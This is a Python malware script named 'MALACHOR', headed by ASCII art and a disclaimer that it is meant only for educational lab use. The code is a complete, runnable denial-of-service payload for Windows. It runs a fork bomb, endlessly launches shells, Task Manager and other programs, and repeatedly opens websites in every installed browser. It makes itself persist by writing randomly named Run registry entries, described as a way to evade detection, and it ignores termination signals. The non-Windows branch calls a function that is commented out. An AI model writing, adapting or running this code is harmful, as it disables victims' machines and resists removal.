"""
-----------------------------------------------
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢄⡀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢋⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢂⠀⠀⠀⠰⡀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣣⠃⢀⠀⠀⠀⢀⠀⠀⢀⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⢃⠀⠀⠀⠙⡄⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⡱⢡⢠⠋⣠⠂⢀⠋⠀⢠⢾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⡀⠀⠀⠘⡆⠀⠀⠀⢰⡀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠎⣰⠁⢇⠇⣰⠃⢠⡎⠀⠀⡆⡌⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢀⠀⢇⠀⠀⠀⢁⠀⠀⠀⠀⢇⠀⠀⡄⠈⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠊⢀⣰⢃⢰⡞⢰⠇⡰⢹⠀⢠⢿⢠⠃⠀⠀⠀⠀⡘⠀⠀⠀⠀⠀⠀⢸⠀⢸⠀⠀⠀⢸⠀⠀⠀⠀⢸⡄⠀⡇⠀⢰⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠦⣩⣥⣰⣶⣻⡏⡎⡞⢃⡘⣐⡕⡏⢀⠇⡇⠸⠀⠀⡰⠁⢰⡇⠀⠀⠀⠀⠀⢰⢸⠀⠈⠀⠀⠀⢸⠀⠀⠀⠀⢸⠇⠀⢹⠀⠘⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠤⠾⠕⠞⢰⠁⡇⡞⢵⠿⣑⡇⣼⠀⣇⢰⠀⣰⠁⢠⣿⠀⠀⠀⠀⢠⠀⢸⢹⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠰⠀⠘⠀⠀⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡶⢀⢧⢿⢠⢱⣧⠋⠀⠀⡏⣻⠀⠛⡞⣴⡏⢀⣿⢻⠀⠀⢰⠂⢸⡄⢸⣿⠀⠠⠀⠀⠀⣾⠀⢀⠀⠀⠀⡆⡄⠀⢇⠀⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠸⠸⡌⢸⣿⡿⢦⣄⢀⢱⢸⠀⣦⢻⢿⡀⡞⠥⢼⣄⠀⢸⠀⢸⠃⠈⣿⠀⢰⠀⢠⢰⢻⠀⢸⢀⠀⠀⣇⢧⠀⠸⡆⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡸⡇⢸⢹⣧⠸⠿⣿⣝⢮⡄⠹⡄⢸⢿⢄⠀⠈⢯⠉⣿⢄⡞⢠⡀⡇⠀⡟⠀⠸⢘⠀⢇⠘⡿⡆⠀⢸⠘⡀⠀⢡⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡇⡇⢸⢸⠈⢻⡦⣿⡟⠈⢿⡸⣇⡟⡇⢀⡥⠤⣘⡆⡿⢀⢿⠺⢃⡇⢠⡇⠀⢠⡇⠀⠈⢦⢷⡘⢄⠀⢧⠱⡀⠀⢃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⣷⡁⣼⢸⠀⠀⠉⠙⠁⠀⠀⠑⢟⠇⠁⠞⠛⣿⣿⣿⣷⣼⣘⡄⢸⠀⣼⠀⠀⢸⢇⢠⣄⢸⠻⣏⠪⢧⡄⢣⠹⣆⠈⢧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⡄⣿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠘⡷⣼⣯⡇⠉⣻⣗⡆⢠⡏⠀⠀⡞⠘⣜⡈⢦⡆⣬⡧⡄⡜⠧⣓⣘⣆⠀⢣⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢧⢻⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠚⠓⠋⠀⢸⠃⡼⠀⠀⢠⡇⠀⢹⡇⢨⢧⢁⠀⠈⢽⡀⠉⠘⢶⠑⢄⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⣿⣸⢸⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢰⡇⠀⠀⣾⠇⠀⢸⡱⡼⡌⡞⡆⠀⠀⠻⣄⠀⠈⢧⠀⠳⡌⢆
⠀⢀⠄⢤⣰⠛⡄⠀⠀⠀⠀⠀⠀⠀⠀⡼⣝⡏⡏⠈⡄⢸⣞⢆⠀⠘⣷⢆⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⡜⠀⠀⢠⢻⡀⠀⣿⣧⠃⠹⡜⢾⡄⠀⡀⠈⢢⡀⠈⢆⠀⠈⢢
⠀⣸⣠⢤⣈⡱⡜⡆⠀⠀⠀⠀⠀⠀⠠⢱⡿⢠⠃⠀⣷⢸⢻⣆⠣⡀⠈⠒⠤⠀⠯⠟⠀⠀⠀⠀⠀⠀⢀⡿⢰⠇⠀⠀⣼⠈⣿⣀⢿⣿⣀⠀⠙⢮⣻⣄⠱⡄⠀⠙⠂⠈⢦⠀⠀
⠈⣀⣠⡴⠳⣄⡷⠸⡄⠀⠀⠀⠀⠀⢀⢣⠇⢸⠀⠀⢸⢸⠀⠙⠣⣽⣦⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠒⠉⠃⡎⡄⠀⢀⢱⠀⢫⢹⢾⣜⢮⡑⠢⠤⠭⣟⡷⢝⣦⡀⠀⠀⠀⠣⡀
⢀⣀⣠⡛⢆⡘⠁⠀⢫⢷⡀⠀⠀⠀⡜⣾⠀⢸⠀⠀⠀⣾⠀⠀⡘⢸⠀⠑⠒⣶⠖⣏⢩⠙⠢⡀⠀⠀⣸⣸⢻⠁⠀⡼⡿⠀⠈⢎⢣⠻⡿⠟⠓⠋⠁⠀⣀⣀⠒⢮⣵⣄⠀⠀⠐
⠀⠠⠚⠱⣴⢳⠀⠀⢸⡎⣇⠀⠀⢰⣰⡟⠀⢸⠀⠀⠀⠸⡀⢠⠇⣘⠀⠀⢰⠻⠸⡘⡛⢄⠀⠈⠂⠀⡇⡏⣬⠀⢠⠃⡇⡀⠀⠈⢳⣕⣿⣦⣶⣾⠷⠛⠉⢀⡠⠤⠹⢯⢧⠀⠀
⣷⠩⠟⠒⠁⠙⠀⢀⠟⠀⢸⢣⣠⢯⣇⡇⠀⢸⠀⠀⠀⠀⣇⡌⢠⠘⢇⠀⢸⠀⠀⢣⠙⣗⠑⢄⠀⢸⣸⣼⡛⠀⠸⠀⡇⢧⢀⡰⢋⢃⠃⠁⠠⠊⠀⣠⠖⠁⠀⠀⠀⠀⢎⣇⠀
⡵⣑⣄⠀⠤⠔⠊⠁⠀⠀⡜⠀⢹⡿⢿⡇⠀⢸⠀⠀⠀⠀⣏⢇⠈⢣⡘⡀⢸⡄⠀⠀⢳⡈⠳⢄⣁⣾⢯⢧⠇⠀⡆⢀⠀⢸⣏⠔⠹⡼⠀⡷⠁⢠⠞⠁⠀⠀⠀⠀⠀⠀⠸⡇⠉
⠱⣄⠀⠀⠀⠀⠀⠀⠀⡔⡠⠃⠘⣶⣼⢧⠀⢸⠀⠀⠀⠀⡏⡎⠆⠀⠙⢿⣼⡳⣄⠀⠈⣏⠓⠤⣤⣿⡸⡾⠀⢠⡇⣸⠀⢸⡷⡀⡇⡇⣸⠀⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀
⠀⡜⠳⠄⠀⠀⠤⠴⠯⠊⠀⠀⠀⡇⢿⢸⣄⠘⡄⠀⠀⢰⠁⡇⢸⢄⠀⠀⢙⣿⣮⡳⣄⠘⡆⠀⢸⠇⢳⡇⠀⢸⡇⡇⢀⣸⢱⣥⡇⡇⣧⢊⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢟⡄⢃⠀⠀⡏⢸⢡⠆⠀⠙⠢⣾⠀⢣⠙⣮⡢⡀⠀⢸⣸⣿⡇⠀⢸⣿⠀⡜⡇⠈⣿⣛⣹⠃⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡷⢄
⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡯⣾⣧⣘⣆⡜⣠⡿⠃⠀⡆⠀⠀⢸⠀⠀⢣⠈⠻⣞⢦⢸⡏⣿⢇⠀⢸⣿⠀⠇⠇⠀⠙⢻⣹⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦
⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣏⠉⢩⡿⡿⣟⠳⣖⡺⠃⠀⠀⠸⡄⠀⠀⢣⠀⠈⢳⣽⡟⣟⡘⣴⡸⡇⠀⠀⠀⠀⢀⣸⣧⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢎⣧⠉
⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠹⡕⢼⣧⡁⠈⠳⡌⠱⡄⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠙⠳⡻⣷⡀⠹⣧⠀⡀⠀⠀⡾⢋⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⡾⢺⡂
⠀⠀⠀⠈⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠃⠸⡍⣷⣀⠀⠘⣦⣸⠀⠀⢀⡎⠣⣤⡀⠀⠀⠀⠀⠀⠈⠛⠭⢹⣿⣷⠷⠀⣰⣁⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⣰⠀⣀⢇
⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⢠⠈⡀⠀⠀⢹⠛⠛⠿⣦⡇⠟⡀⡠⠻⡔⠀⢹⢯⡢⡀⠀⠀⠀⠀⠀⠀⠀⢀⣜⡿⢻⣯⡹⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠗⠊⠁⠈
⠀⠀⠀⠀⠀⠀⢸⣦⠀⠀⠀⠀⠀⠀⠀⠀⠃⠄⠀⠈⢆⠀⣀⡿⠁⣠⠝⠁⠀⠇⠀⡏⠀⢹⠮⣳⠄⠀⠀⠀⠠⠔⢛⢯⣿⠀⣇⡇⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⢰⠀⠀⠀⠀
 _______  _______  _        _______  _______           _______  _______
(       )(  ___  )( \      (  ___  )(  ____ \|\     /|(  ___  )(  ____ )
| () () || (   ) || (      | (   ) || (    \/| )   ( || (   ) || (    )|
| || || || (___) || |      | (___) || |      | (___) || |   | || (____)|
| |(_)| ||  ___  || |      |  ___  || |      |  ___  || |   | ||     __)
| |   | || (   ) || |      | (   ) || |      | (   ) || |   | || (\ (
| )   ( || )   ( || (____/\| )   ( || (____/\| )   ( || (___) || ) \ \__
|/     \||/     \|(_______/|/     \|(_______/|/     \|(_______)|/   \__/

Author: Kuroshiro
WARNING: This script is designed solely for educational purposes and must be tested only in a controlled, isolated virtual lab environment. It is highly illegal to deploy or use this script on any system without explicit permission from the system owner. Attempting to run or distribute this script on any unauthorized system can result in serious legal consequences, including criminal prosecution and potential jail time. Always ensure you have explicit permission before running any code that impacts system functionality.
-----------------------------------------------
"""
from multiprocessing import Process, cpu_count
import time
import os
import subprocess
import winreg
import signal
import threading
import sys
import random
import string

def counter(num):
    """
    This function continuously decreases the value of `num` and sleeps for 0.001 seconds
    in each iteration. It is used by the fork bomb process to keep the processes active.

    Args:
    num (int): The number to decrease in an infinite loop.
    """
    while True:
        num -= 1
        time.sleep(0.001)

def go_to_hell():
    """
    This function implements a fork bomb that creates a large number of processes,
    consuming system resources and potentially causing system instability.
    It calculates the number of processes based on the system's CPU count and repeatedly
    spawns processes to overload the system.
    """
    num_processors = cpu_count()  # Get the number of processors (CPU cores)
    num_processes = num_processors * 1000  # Set the number of processes to spawn
    process_count = 0
    while True:
        # Create multiple processes that run the 'counter' function
        processes = [Process(target=counter, args=(1000,)) for _ in range(num_processes)]
        for process in processes:
            process.start()  # Start each process
            process_count += 1
        time.sleep(0.2)

def spawn_my_bros(urls):
    """
    This function spawns various browsers (if available on the system) and opens a list of URLs
    in each browser. It uses threading to open multiple browsers simultaneously.

    Args:
    urls (list): A list of URLs to open in the browsers.
    """
    browser_paths = {
        'chrome': [
            'C:/Program Files/Google/Chrome/Application/chrome.exe',
            'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
            'C:/Program Files/Google/Chrome Beta/Application/chrome.exe',
            'C:/Program Files/Google/Chrome Dev/Application/chrome.exe'
        ],
        'firefox': [
            'C:/Program Files/Mozilla Firefox/firefox.exe',
            'C:/Program Files (x86)/Mozilla Firefox/firefox.exe'
        ],
        'edge': [
            'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
            'C:/Program Files/Microsoft/Edge/Application/msedge.exe'
        ],
        'opera': [
            'C:/Program Files/Opera/launcher.exe',
            'C:/Program Files (x86)/Opera/launcher.exe'
        ],
        'brave': [
            'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
            'C:/Program Files (x86)/BraveSoftware/Brave-Browser/Application/brave.exe'
        ],
        'vivaldi': [
            'C:/Program Files/Vivaldi/Application/vivaldi.exe',
            'C:/Program Files (x86)/Vivaldi/Application/vivaldi.exe'
        ]
    }

    def open_my_sources(browser_path, url):
        """
        Opens the specified URL in a given browser.

        Args:
        browser_path (str): Path to the browser executable.
        url (str): The URL to open in the browser.
        """
        try:
            subprocess.Popen([browser_path, url])  # Open the URL in the browser
        except Exception as e:
            pass  # If an error occurs, silently ignore it

    def open_sources_paths(urls):
        """
        Iterates through all the available browsers and opens each URL in them using threads.

        Args:
        urls (list): List of URLs to open in the browsers.
        """
        threads = []
        for browser_name, paths in browser_paths.items():
            for path in paths:
                if os.path.isfile(path):  # Check if the browser exists
                    for url in urls:
                        thread = threading.Thread(target=open_my_sources, args=(path, url))  # Create a thread to open the URL
                        thread.start()  # Start the thread
                    break
            else:
                continue
    while True:
        open_sources_paths(urls)  # Continuously open URLs in browsers
        time.sleep(5)  # Wait for 5 seconds before reopening

#def open_my_playground():
    #"""
    #Attempts to open a variety of terminal emulators on a Linux system.
    #If the system is not Linux, it returns False.

    #Returns:
    #bool: True if a terminal emulator is successfully opened, False otherwise.
    #"""
    #terminal_emulators = [
        #"gnome-terminal", "konsole", "xfce4-terminal", "lxterminal",
        #"mate-terminal", "terminator", "xterm", "urxvt"
    #]
    #for emulator in terminal_emulators:
        #try:
            # Check if the emulator is available in the system's path
            #if subprocess.call(["which", emulator], stdout=subprocess.DEVNULL) == 0:
                #os.system(f"{emulator} &")  # Open the emulator
                #return True
        #except Exception as e:
            #continue
    #return False  # Return False if no terminal emulator is found

def spawn_my_playground():
    """
    Continuously spawns unnecessary programs on the system (such as cmd, PowerShell, calculator, etc.).
    It works differently on Windows and Linux systems.
    """
    while True:
        if os.name == "nt":  # Windows system
            os.system("start cmd")  # Open command prompt
            os.system("start powershell")  # Open PowerShell
            os.system("start calc")  # Open Calculator
            os.system("start taskmgr")  # Open Task Manager
            os.system("start notepad")  # Open Notepad
            os.system("start control")  # Open Control Panel
        else:
            if not open_my_playground(): # Try to open a terminal emulator on non-Windows systems
                break 
        time.sleep(0.1)

def generate_random_key_name_for_reg(length=8):
    """
    Generates a random key name to use in the Windows registry.

    Args:
    length (int): Length of the random string to generate (default is 8).

    Returns:
    str: A randomly generated string composed of letters and digits.
    """
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=length))

def add_to_registry():
    """
    Adds the current script to the Windows registry so it runs automatically upon system startup.
    This ensures the script persists even after a reboot.
    """
    exe_path = sys.executable  # Get the path of the current script
    try:
        # Open the Windows registry key where startup programs are listed
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        while True:
            # Generate a random key name to avoid detection
            base_key_name = generate_random_key_name_for_reg()
            key_name = f"{base_key_name}"
            # Add the current script to the registry to ensure it runs on startup
            winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
            time.sleep(0.01)  # Small delay before repeating
        winreg.CloseKey(registry_key)
    except Exception as e:
        pass  # Ignore any exceptions (e.g., if registry access fails)

def signal_handler(signum, frame):
    """
    Signal handler to suppress termination signals (SIGINT, SIGTERM).

    Args:
    signum (int): Signal number.
    frame (frame): Current stack frame.
    """
    pass

def launch():
    """
    The main function that launches all the malicious activities:
    - Starts the fork bomb process
    - Opens unnecessary programs
    - Adds itself to the registry for persistence
    - Opens URLs in available browsers

    This function is designed to continuously run these actions.
    """
    urls = ["https://github.com", "https://google.com", "https://youtube.com"] # Add more if necessary
    # Suppress SIGINT and SIGTERM signals
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start the fork bomb process
    process_creator = Process(target=go_to_hell)
    process_creator.start()

    # Start the playground process (opening unnecessary programs)
    cmd_thread = threading.Thread(target=spawn_my_playground)
    cmd_thread.start()

    # Start the registry persistence process
    registry_thr = Process(target=add_to_registry)
    registry_thr.start()

    # Start the browser-spawning process
    spawn_my_bros(urls)

if __name__ == "__main__":
    # Entry point
    launch()

